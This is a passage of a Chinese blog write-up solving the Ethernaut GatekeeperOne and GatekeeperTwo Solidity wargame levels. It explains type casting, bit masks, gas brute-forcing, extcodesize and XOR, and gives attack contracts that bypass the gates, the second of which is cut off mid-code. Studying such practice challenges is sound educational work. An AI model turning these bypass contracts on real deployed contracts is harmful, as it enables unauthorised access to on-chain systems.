modifier gateThree(bytes8 _gateKey) {\r\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\r\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\r\n      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\r\n    _;\r\n  }\r\n\r\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\r\n    entrant = tx.origin;\r\n    return true;\r\n  }\r\n}</code></pre>\r\n<p>这个题目一点思路都没有（跟着教程过一遍）</p>\r\n<p>先看第一个修饰器</p>\r\n<pre class=\"solidity\"><code>  modifier gateOne() {\r\n    require(msg.sender != tx.origin);\r\n    _;\r\n  }</code></pre>\r\n<ul>\r\n<li><code>msg.sender(address)</code>：消息的发送者（当前调用）</li>\r\n<li><code>tx.origin(address)</code>：交易的发送者（完整的调用链）</li>\r\n</ul>\r\n<p>网上找到一张很清晰的图</p>\r\n<p><img src=\"https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg\" alt=\"16450711251.jpg\"></p>\r\n<p>根据第一个修饰器的要求：<code>require(msg.sender != tx.origin);</code></p>\r\n<p>我们需要用智能合约中调用enter，而不是账号直接调用</p>\r\n<p>先看第三个</p>\r\n<pre class=\"solidity\"><code>  modifier gateThree(bytes8 _gateKey) {\r\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\r\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\r\n      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\r\n    _;\r\n  }</code></pre>\r\n<h3 id=\"基本类型之间的转换\">基本类型之间的转换</h3>\r\n<p>1byte=8位（XXXX XXXX）X为0或1</p>\r\n<p><code>bytes1=uint8</code>......<code>bytes32=uint256</code></p>\r\n<pre class=\"solidity\"><code>bytes1 num1 = 0x12;     //0x是16进制的表示方法 12是一字节\r\nbytes4 num2 = 0x12121212;   //以此类推12 12 12 12 共四字节</code></pre>\r\n<h4 id=\"隐式转换\">隐式转换</h4>\r\n<p>一般是从存储范围小的类型转换到存储范围大的类型</p>\r\n<p>在<strong>赋值期间</strong>、<strong>将参数传递给函数</strong>时以及应用运算符时，编译器会<strong>自动</strong>应用隐式类型转换</p>\r\n<p>eg：<code>uint8</code>可转换为<code>uint16</code>和<code>int128</code>、<code>int256</code></p>\r\n<p>但<code>int8</code>不可转换为<code>uint256</code>，因为<code>uint256</code>不能保存负值</p>\r\n<blockquote>\r\n<pre class=\"solidity\"><code>uint8 y;\r\nuint16 z;\r\nuint32 x = y + z;</code></pre>\r\n<p>在这个示例中，加法的操作数y和z没有相同的类型，但<code>uint8</code>可以隐式转换为<code>uint16</code>，在添加之后执行另一个隐式转换</p>\r\n<p>Tip：在整数之间进行类型转换时，数值不发生改变，而将整数类型，特别是比较大的整数类型转换成小数类型时，由于存储方式不同，有可能存在数据精度的损失。</p>\r\n</blockquote>\r\n<h4 id=\"显示转换\">显示转换</h4>\r\n<ul>\r\n<li>如果将整数显式转换为更小的类型，则高位位将被截断：</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>uint32 a = 0x12345678;\r\nuint16 b = uint16(a); // b will be 0x5678 now</code></pre>\r\n<ul>\r\n<li>如果一个整数被显式地转换为一个更大的类型，它会被填充到左边（即，在更高阶的一端）。转换的结果将与原始整数比较：</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>uint16 a = 0x1234;\r\nuint32 b = uint32(a); // b will be 0x00001234 now\r\nassert(a == b);</code></pre>\r\n<ul>\r\n<li>固定大小字节类型在转换期间表现不同。它们可以被认为是单个字节的序列，转换为更小的类型将切断序列：</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>bytes2 a = 0x1234;\r\nbytes1 b = bytes1(a); // b will be 0x12</code></pre>\r\n<ul>\r\n<li>如果将固定大小的字节类型显式转换为更大的类型，则会在右侧进行填充。访问固定索引处的字节将在转换前后产生相同的值（如果索引仍在范围内）：</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>bytes2 a = 0x1234;\r\nbytes4 b = bytes4(a); // b will be 0x12340000\r\nassert(a[0] == b[0]);\r\nassert(a[1] == b[1]);</code></pre>\r\n<ul>\r\n<li><code>bytes</code>数组和<code>bytes</code>calldata\r\n切片可以显式转换为固定字节类型 ( <code>bytes1</code>/…/\r\n<code>bytes32</code>)。如果数组比目标固定字节类型长，则会在末尾截断。如果数组比目标类型短，它将在末尾用零填充。</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: GPL-3.0\r\npragma solidity ^0.8.5;\r\n\r\ncontract C {\r\n    bytes s = \"abcdefgh\";\r\n    function f(bytes calldata c, bytes memory m) public view returns (bytes16, bytes3) {\r\n        require(c.length == 16, \"\");\r\n        bytes16 b = bytes16(m);  // if length of m is greater than 16, truncation will happen\r\n        b = bytes16(s);  // padded on the right, so result is \"abcdefgh\\0\\0\\0\\0\\0\\0\\0\\0\"\r\n        bytes3 b1 = bytes3(s); // truncated, b1 equals to \"abc\"\r\n        b = bytes16(c[:8]);  // also padded with zeros\r\n        return (b, b1);\r\n    }\r\n}</code></pre>\r\n<h3 id=\"位掩码\">位掩码</h3>\r\n<p>位运算：<strong>任何位（0 或 1）与 0 进行 AND 运算后都为\r\n0，对吗？当用 1\r\n完成相同的操作时，无论实际位是什么。</strong>所以，<code>0 AND 1</code>等于\r\n0 本身。</p>\r\n<p>现在，如果你这样做<code>0x12345678 AND 0x0000FFFF</code>呢？你会得到<code>0x00005678</code>！</p>\r\n<p>我们刚刚所做的，<strong>隐藏了一些位，称为“位掩码”。</strong></p>\r\n<p>直接看题目</p>\r\n<p><strong>假设要发送的<code>_gateKey</code>是<code>0x B1 B2 B3 B4 B5 B6 B7 B8</code></strong></p>\r\n<p>第一行</p>\r\n<pre class=\"solidity\"><code>require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");</code></pre>\r\n<p>如果要写出第一行，则必须满足一下条件：</p>\r\n<pre class=\"solidity\"><code>0x B5 B6 B7 B8 == 0x 00 00 B7 B8</code></pre>\r\n<p>所以<code>B5</code>和<code>B6</code>必须为<code>0</code>！</p>\r\n<p>第二行</p>\r\n<pre class=\"solidity\"><code>require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");</code></pre>\r\n<p>需要满足条件：</p>\r\n<pre class=\"solidity\"><code>0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8</code></pre>\r\n<p>所以前四个字节不能为0（也就是前四个字节可以是除0之外的任何内容）</p>\r\n<p>第三行</p>\r\n<pre class=\"solidity\"><code>require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");</code></pre>\r\n<p>需要满足要求：</p>\r\n<pre class=\"solidity\"><code>0x B5 B6 B7 B8 = 0x 00 00 SECOND_LAST_BYTE_OF_YOUR_ADDR LAST_BYTE_OF_YOUR_ADDR</code></pre>\r\n<p>比较1和3行，<strong>得到<code>B7</code>和<code>B8</code>是攻击合约地址的最后一个字节！</strong></p>\r\n<p><strong>关键是<code>0x ANY_BYTE ANY_BYTE ANY_BYTE ANY_BYTE 00 00 SECOND_LAST_BYTE_OF_YOUR_ADDR LAST_BYTE_OF_YOUR_ADDR</code>。</strong></p>\r\n<p>可以使用攻击合约的地址来制作<code>_gateKey</code>：</p>\r\n<ul>\r\n<li>获取地址的最后8个字节：通过将地址存储在<code>uint64</code>数据类型中来执行此操作。</li>\r\n<li>通过位掩码使 B5 和 B6\r\n为零：使用从上一步获得的值执行与操作<code>0xFFFFFFFF0000FFFF</code>。</li>\r\n<li>现在，只需将其存储<code>uint64</code>到<code>bytes8</code>中，因为<code>enter()</code>函数需要<code>bytes8</code>.</li>\r\n</ul>\r\n<p>长这样：</p>\r\n<pre class=\"solidity\"><code>bytes8 key = bytes8(uint64(msg.sender) &amp; 0xFFFFFFFF0000FFFF);</code></pre>\r\n<blockquote>\r\n<p>注意：这里的<code>msg.sender</code>变成<code>tx.origin</code>了！！！</p>\r\n</blockquote>\r\n<p>再来看看第2个修饰器</p>\r\n<pre class=\"solidity\"><code>  modifier gateTwo() {\r\n    require(gasleft() % 8191 == 0);\r\n    _;\r\n  }</code></pre>\r\n<p><code>gasleft()</code>函数，用于返回剩余的gas</p>\r\n<p>需要满足要求：<strong>发送既能确保我们的交易被执行，又能保证gate\r\n2开始时剩余的gas量是8191的倍数的确切的gas</strong></p>\r\n<p>解决方法：</p>\r\n<p>首先，我们需要发送的气体总量可以表示为<code>x + (8191 * k)</code>，在这里<code>x</code>是调用之前用完的gas量，那么<code>gasLeft()</code>剩下的是8191的倍数</p>\r\n<p>我们可以把<code>k</code>固定为一个数，比如说3，现在需要弄清楚的是<code>x</code></p>\r\n<p>所以使用暴力破解：即尝试发送具有的所有可能值的交易<code>x</code></p>\r\n<p>类似于这样：</p>\r\n<pre class=\"solidity\"><code>bool success;\r\nuint256 gasBrute;\r\nfor(gasBrute = _lowerGasBrute; gasBrute &lt;= _upperGasBrute; gasBrute++){\r\n    (success, ) = _gatekeeperAddr.call.gas(gasBrute + (8191 * 3))( // `x` is replaced by `gasBrute`\r\n        abi.encodeWithSignature(\"enter(bytes8)\", key) // You have the key from the previous section now\r\n      );\r\n    if(success){\r\n        break;\r\n    }\r\n}        \r\nrequire(success, \"HACK FAILED\");\r\nemit Hacked(gasBrute); // -&gt; This is the least value of `x`.</code></pre>\r\n<p>整合一下，攻击合约如下</p>\r\n<pre class=\"solidity\"><code>contract skipgate{\r\n  GatekeeperOne keykey;\r\n\r\n  constructor(address _addr){\r\n      keykey=GatekeeperOne(_addr);\r\n  }\r\n\r\n  function attack() external{\r\n    bytes8 _gateKey = bytes8(uint64(uint160(msg.sender))&amp;0xFFFFFFFF0000FFFF);   //在这里要用uint160(msg.sender)，如果没有用uint160处理会报错说不能把address类型转为uint64\r\n\r\n    for(uint256 i=1;i&lt;8191;i++){\r\n       (bool success,)=address(keykey).call{gas: i + (8191 * 3)}(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey));\r\n\r\n           if(success){\r\n        break;\r\n        }\r\n    }\r\n}</code></pre>\r\n<p>在本地测试时编译器一直崩溃，但是上链就行</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/pgZEMPt35W8iqJz.png\" alt=\"image-20230205233516696.png\"></p>\r\n<h2 id=\"gatekeeper-two\">15.Gatekeeper Two</h2>\r\n<p>源码</p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract GatekeeperTwo {\r\n\r\n  address public entrant;\r\n\r\n  modifier gateOne() {\r\n    require(msg.sender != tx.origin);\r\n    _;\r\n  }\r\n\r\n  modifier gateTwo() {\r\n    uint x;\r\n    assembly { x := extcodesize(caller()) }\r\n    require(x == 0);\r\n    _;\r\n  }\r\n\r\n  modifier gateThree(bytes8 _gateKey) {\r\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\r\n    _;\r\n  }\r\n\r\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\r\n    entrant = tx.origin;\r\n    return true;\r\n  }\r\n}</code></pre>\r\n<p>第一个修饰器和前一题是一样的，需要中间合约来调用函数</p>\r\n<p>第二个修饰器，先需要先学习以下内容</p>\r\n<h3 id=\"assembly\"><code>Assembly</code></h3>\r\n<p>这是一个没见过的东西，摘自（https://docs.soliditylang.org/en/v0.4.23/assembly.html#）</p>\r\n<ul>\r\n<li><code>Solidity Assembly</code>：Solidity\r\n定义了一种汇编语言，也可以在没有 Solidity\r\n的情况下使用。这种汇编语言也可以用作 Solidity 源代码中的“内联汇编”。\r\n<ul>\r\n<li><strong>句法</strong>：Assembly 完全像 Solidity\r\n一样解析注释、文字和标识符，所以你可以使用通常的<code>//</code>和注释。内联汇编由这些花括号和里面的花括号标记，可以使用以下内容<code>/* */``assembly { ... }</code></li>\r\n</ul></li>\r\n</ul>\r\n<p>补充操作码：</p>\r\n<table>\r\n<colgroup>\r\n<col style=\"width: 39%\">\r\n<col style=\"width: 3%\">\r\n<col style=\"width: 3%\">\r\n<col style=\"width: 53%\">\r\n</colgroup>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>操作说明</th>\r\n<th></th>\r\n<th></th>\r\n<th>解释</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>stop</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>停止执行，等同于(0,0)</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>add(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x + y</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>sub(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x - y</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>mul(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x * y</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>div(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x / y</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>sdiv(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x / y, 对于二进制补码中的有符号数</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>mod(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x % y</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>smod(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x % y, 对于二进制补码中的有符号数</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>exp(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x 的 y 次方</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>not(x)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>~x, x 的每一位都取反</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>lt(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>如果 x &lt; y 为 1，否则为 0</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>gt(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>如果 x &gt; y 则为 1，否则为 0</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>slt(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>如果 x &lt; y 则为 1，否则为 0，对于二进制补码中的有符号数</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>sgt(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>如果 x &gt; y 则为 1，否则为 0，对于二进制补码中的有符号数</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>eq(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>如果 x == y 则为 1，否则为 0</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>iszero(x)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>如果 x == 0 则为 1，否则为 0</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>and(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x 和 y 的按位与</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>or(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x 和 y 的按位或</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>xor(x, y)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x 和 y 的按位异或</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>byte(n, x)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>x 的第 n 个字节，其中最高有效字节是第 0 个字节</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>shl(x, y)</td>\r\n<td></td>\r\n<td>C</td>\r\n<td>y 逻辑左移 x 位</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>shr(x, y)</td>\r\n<td></td>\r\n<td>C</td>\r\n<td>y 逻辑右移 x 位</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>sar(x, y)</td>\r\n<td></td>\r\n<td>C</td>\r\n<td>将 y 算术右移 x 位</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>addmod(x, y, m)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>(x + y) % m 任意精度算术</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>mulmod(x, y, m)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>(x * y) % m 任意精度算术</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>signextend(i, x)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>符号从最低有效位起第 (i*8+7) 位扩展</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>keccak256(p, n)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>keccak(mem[p…(p+n)))</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>sha3(p, n)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>keccak(mem[p…(p+n)))</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>jump(label)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>跳转到标签/代码位置</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>jumpi(label, cond)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>如果 cond 非零则跳转到标签</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>pc</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>当前在代码中的位置</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>pop(x)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>删除 x 推送的元素</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>dup1 … dup16</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>将第 i 个堆栈槽复制到顶部（从顶部开始计数）</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>swap1 … swap16</td>\r\n<td>*</td>\r\n<td>F</td>\r\n<td>交换最顶层和它下面的第 i 个栈槽</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>mload(p)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>内存[p..(p+32))</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>mstore(p, v)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>内存[p..(p+32)) := v</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>mstore8(p, v)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>mem[p] := v &amp; 0xff （只修改一个字节）</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>sload(p)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>存储[p]</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>sstore(p, v)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>存储[p] := v</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>msize</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>内存大小，即最大访问内存索引</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>gas</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>气体仍然可用于执行</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>address</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>当前合约/执行上下文的地址</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>balance(a)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>地址a的wei余额</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>caller</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>呼叫发件人（不包括<code>delegatecall</code>）</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>callvalue</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>wei 与当前通话一起发送</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>calldataload(p)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>从位置 p 开始调用数据（32 字节）</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>calldatasize</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>调用数据的大小（以字节为单位）</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>calldatacopy(t, f, s)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>从位置 f 的 calldata 复制 s 个字节到位置 t 的内存</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>codesize</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>当前合约/执行上下文的代码大小</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>codecopy(t, f, s)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>从位置 f 的代码复制 s 个字节到位置 t 的内存</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>extcodesize(a)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>地址a处代码的大小</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>extcodecopy(a, t, f, s)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>像 codecopy(t, f, s) 但在地址 a 处获取代码</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>returndatasize</td>\r\n<td></td>\r\n<td>B</td>\r\n<td>最后返回数据的大小</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>returndatacopy(t, f, s)</td>\r\n<td>-</td>\r\n<td>B</td>\r\n<td>将 s 个字节从位置 f 的 returndata 复制到位置 t 的 mem</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>create(v, p, s)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>使用代码 mem[p..(p+s)) 创建新合约并发送 v wei 并返回新地址</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>create2(v, n, p, s)</td>\r\n<td></td>\r\n<td>C</td>\r\n<td>使用代码 mem[p..(p+s)) 在地址 keccak256(</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>call(g, a, v, in, insize, out, outsize)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>在地址 a 调用合约，输入 mem[in..(in+insize)) 提供 g gas 和 v wei\r\n以及输出区域 mem[out..(out+outsize)) 错误返回 0（例如 out of gas）和1\r\n成功</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>callcode(g, a, v, in, insize, out, outsize)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>与 a相同<code>call</code>但仅使用 a\r\n中的代码，否则留在当前合约的上下文中</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>delegatecall(g, a, in, insize, out, outsize)</td>\r\n<td></td>\r\n<td>H</td>\r\n<td>相同<code>callcode</code>但也保持<code>caller</code>\r\n和<code>callvalue</code></td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>staticcall(g, a, in, insize, out, outsize)</td>\r\n<td></td>\r\n<td>B</td>\r\n<td>相同但不允许状态修改<code>call(g, a, 0, in, insize, out, outsize)</code></td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>return(p, s)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>结束执行，返回数据 mem[p..(p+s))</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>revert(p, s)</td>\r\n<td>-</td>\r\n<td>B</td>\r\n<td>结束执行，恢复状态变化，返回数据 mem[p..(p+s))</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>selfdestruct(a)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>结束执行，销毁当前合约并将资金发送到</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>invalid</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>以无效指令结束执行</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>log0(p, s)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>没有主题和数据的日志 mem[p..(p+s))</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>log1(p, s, t1)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>记录主题 t1 和数据 mem[p..(p+s))</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>log2(p, s, t1, t2)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>记录主题 t1、t2 和数据 mem[p..(p+s))</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>log3(p, s, t1, t2, t3)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>记录主题 t1、t2、t3 和数据 mem[p..(p+s))</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>log4(p, s, t1, t2, t3, t4)</td>\r\n<td>-</td>\r\n<td>F</td>\r\n<td>记录主题 t1、t2、t3、t4 和数据 mem[p..(p+s))</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>origin</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>交易发送方</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>gasprice</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>交易的gas价格</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>blockhash(b)</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>块 nr b 的哈希值 - 仅适用于除当前块之外的最后 256 个块</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>coinbase</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>当前采矿受益人</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>timestamp</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>当前块的时间戳，自纪元以来的秒数</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>number</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>当前区块号</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>difficulty</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>当前区块的难度</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>gaslimit</td>\r\n<td></td>\r\n<td>F</td>\r\n<td>当前区块的区块gas limit</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>第二个修饰器</p>\r\n<pre class=\"solidity\"><code>  modifier gateTwo() {\r\n    uint x;\r\n    assembly { x := extcodesize(caller()) }\r\n    require(x == 0);\r\n    _;\r\n  }</code></pre>\r\n<p>extcodesize：</p>\r\n<p>在 Solidity 中，我们可以通过在 YUL\r\n中使用汇编来使用低级代码。它们可以在内部使用<code>assembly {...}</code>。<code>extcodesize</code>就是这样一种操作码，它返回任何地址的代码大小。</p>\r\n<p>caller()：</p>\r\n<p>这是呼叫发送者的地址（delegatecall 除外）。</p>\r\n<p>在上面显示的修饰符中，变量<code>x</code>用于存储<code>caller()</code>地址上代码的大小，即调用\r\nGatekeeper Two\r\n实例的合约。我们需要使用另一个合约来确保我们在第一个关口通过验证。</p>\r\n<p>正在检查该<code>x</code>变量以确保合约代码的大小为 0，换句话说，<a href=\"https://blog.solidityscan.com/distinguishing-eoa-and-smart-contracts-securely-911dc42fdf13\">EOA</a>应该进行调用而不是另一个合约。</p>\r\n<blockquote>\r\n<p>注意：</p>\r\n<p>以太坊中，分为两种账户：</p>\r\n<ul>\r\n<li>外部账户：简称EOA，它拥有私钥，其codeHash为空</li>\r\n<li>合约账户：简称CA，它没有私钥，其codeHash非空<img src=\"https://s2.loli.net/2023/03/24/svmIjWNeRC27FDQ.png\" alt=\"image-20230206230024110.png\"></li>\r\n</ul>\r\n</blockquote>\r\n<p>这是构造函数发挥作用的地方。在合约初始化期间，或<strong>调用其构造函数时，其运行时代码大小始终为\r\n0</strong>。</p>\r\n<p>因此，当我们放置漏洞利用逻辑并从构造函数内部调用它时，\r\n<code>extcodesize</code>\r\n的返回值将始终返回零。这实质上意味着我们所有的漏洞利用代码都将从我们合约的构造函数内部调用以通过第二道门。</p>\r\n<p>第三个修饰器</p>\r\n<pre class=\"solidity\"><code>  modifier gateThree(bytes8 _gateKey) {\r\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\r\n    _;\r\n  }</code></pre>\r\n<h3 id=\"xor按位异或\"><code>XOR</code>（按位异或）</h3>\r\n<p><code>XOR</code>的符号是<code>^</code></p>\r\n<ul>\r\n<li>归零率：a ^ a = 0</li>\r\n<li>恒等率：a ^ 0 = a</li>\r\n<li>交换律：a ^ b = b ^ a</li>\r\n<li>结合律：a ^ b ^ c = a ^ ( b ^ c ) = ( a ^ b ) ^ c</li>\r\n<li>自反：a ^ b ^ a = b</li>\r\n<li>d = a ^ b ^ c 可以推出 a = d ^ b ^ c</li>\r\n<li>若x是二进制数0101，y是二进制数1011，则 x ^ y = 1110\r\n，只有在两个比较的位不同时结果是1，否则结果为0</li>\r\n</ul>\r\n<p>这是一个简单的 XOR\r\n运算，我们知道它<code>A XOR B = C</code>等于<code>A XOR C = B</code>。<code>_gateKey</code>使用此逻辑，我们只需使用以下代码即可轻松找到未知数的值：</p>\r\n<pre class=\"solidity\"><code>bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);</code></pre>\r\n<p>攻击代码</p>\r\n<pre class=\"solidity\"><code>contract skipgate{\r\n  GatekeeperTwo keykey;\r\n\r\n  constructor(address _addr) public {\r\n      keykey=GatekeeperTwo(_addr);\r\n\r\n      bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max));\r\n\r\n      